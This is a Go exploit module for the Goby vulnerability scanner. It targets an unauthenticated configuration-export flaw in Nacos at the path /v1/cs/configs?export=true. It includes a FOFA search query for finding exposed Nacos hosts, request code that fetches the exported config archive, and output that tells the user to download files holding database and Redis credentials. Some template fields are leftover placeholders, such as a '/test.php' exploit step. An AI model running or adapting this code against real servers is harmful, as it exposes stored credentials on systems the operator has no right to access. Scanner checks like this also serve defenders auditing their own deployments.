package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Nacos /v1/cs/configs Information Disclosure Vulnerability",
    "Description": "<p>Nacos is a dynamic service discovery, configuration management, and service management platform that makes it easier to build cloud-native applications. Nacos has an unauthorized file download vulnerability, allowing attackers to download system configuration files without logging in.</p>",
    "Product": "NACOS",
    "Homepage": "https://nacos.io/zh-cn/index.html",
    "DisclosureDate": "2024-09-22",
    "PostTime": "2024-10-17",
    "Author": "2987612621@qq.com",
    "FofaQuery": "title=\"Nacos\" || (body=\"Alibaba Group Holding Ltd.\" && body=\"src=\\\"js/main.js\" && body=\"console-fe\") || (banner=\"/nacos/\" && (banner=\"HTTP/1.1 302\" || banner=\"HTTP/1.1 301 Moved Permanently\")) || banner=\"realm=\\\"nacos\"||protocol=\"nacos\"||protocol=\"nacos(http)\"",
    "GobyQuery": "title=\"Nacos\" || (body=\"Alibaba Group Holding Ltd.\" && body=\"src=\\\"js/main.js\" && body=\"console-fe\") || (banner=\"/nacos/\" && (banner=\"HTTP/1.1 302\" || banner=\"HTTP/1.1 301 Moved Permanently\")) || banner=\"realm=\\\"nacos\"||protocol=\"nacos\"||protocol=\"nacos(http)\"",
    "Level": "2",
    "Impact": "<p>Attackers can exploit this vulnerability to unauthorizedly obtain system configuration files, such as database and Redis connection addresses, login accounts, and passwords.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://github.com/sylabs/sif\"></a><a href=\"https://nacos.io/zh-cn/index.html\">https://nacos.io/zh-cn/index.html</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls. </p><p>3. If not necessary, prohibit public network access to the system.</p><p>4. Implement session authentication for unauthorized access pages, strictly review the access permissions of backend functionality pages, and deny access to users who are not logged in.</p>",
    "References": [
        "https://blog.csdn.net/xc_214/article/details/142435014"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/v1/cs/configs?export=true&group=&tenant=&appName=&ids=&dataId=",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "Nacos /v1/cs/configs 信息泄露漏洞",
            "Product": "NACOS",
            "Description": "<p>Nacos是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。Nacos存在未授权文件下载，攻击者在不登录情况下可未授权下载系统配置文件。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://nacos.io/zh-cn/index.html\">https://nacos.io/zh-cn/index.html</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。<br></p><p>4、对未授权访问页面做session认证，严格审核后台功能页面的访问权限，若为未登录用户则拒绝访问。</p>",
            "Impact": "<p>攻击者利用该漏洞可未授权获取到系统配置文件，如数据库和Redis连接地址，登录账号和密码等<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Nacos /v1/cs/configs Information Disclosure Vulnerability",
            "Product": "NACOS",
            "Description": "<p>Nacos is a dynamic service discovery, configuration management, and service management platform that makes it easier to build cloud-native applications. Nacos has an unauthorized file download vulnerability, allowing attackers to download system configuration files without logging in.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://github.com/sylabs/sif\"></a><a href=\"https://nacos.io/zh-cn/index.html\">https://nacos.io/zh-cn/index.html</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p><p>4.&nbsp;Implement session authentication for unauthorized access pages, strictly review the access permissions of backend functionality pages, and deny access to users who are not logged in.</p>",
            "Impact": "<p>Attackers can exploit this vulnerability to unauthorizedly obtain system configuration files, such as database and Redis connection addresses, login accounts, and passwords.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9961"
}`

sendPayloaddfgjaskfjsd := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
  
  vulPath := `/v1/cs/configs`
  vulInfo := `?export=true&group=&tenant=&appName=&ids=&dataId=`
  
      GetRequestConfig := httpclient.NewGetRequestConfig(vulPath + vulInfo)
      GetRequestConfig.VerifyTls = false
      GetRequestConfig.FollowRedirect = false
    
      //请求
      response, err := httpclient.DoHttpRequest(hostInfo, GetRequestConfig)
      if err != nil {
        return false, vulInfo, vulPath
      }
    
      if strings.Contains(response.RawBody, "PK") {
        return true, vulInfo, vulPath
      }
    
  
  return false, vulInfo, vulPath
}
ExpManager.AddExploit(NewExploit(
  goutils.GetFileName(),
  expJson,
  func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
    // 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
    respBool, vulInfo, vulPath := sendPayloaddfgjaskfjsd(hostInfo)

    // --------------------------------------------------
    // 请注意，后续为模板内容，正常情况下无需修改
    
    if respBool {
      ss.VulURL = hostInfo.Scheme() + "://" + hostInfo.HostInfo + vulPath + vulInfo
      return true
    }
    return false
  },
  func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
    // 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可

    // --------------------------------------------------
    // 请注意，后续为模板内容，正常情况下无需修改
    _, vulInfo, _ := sendPayloaddfgjaskfjsd(expResult.HostInfo)
    expResult.Output = `请使用/v1/cs/configs`+vulInfo+`下载配置文件`
    expResult.Success = true
    return expResult
  },
))
}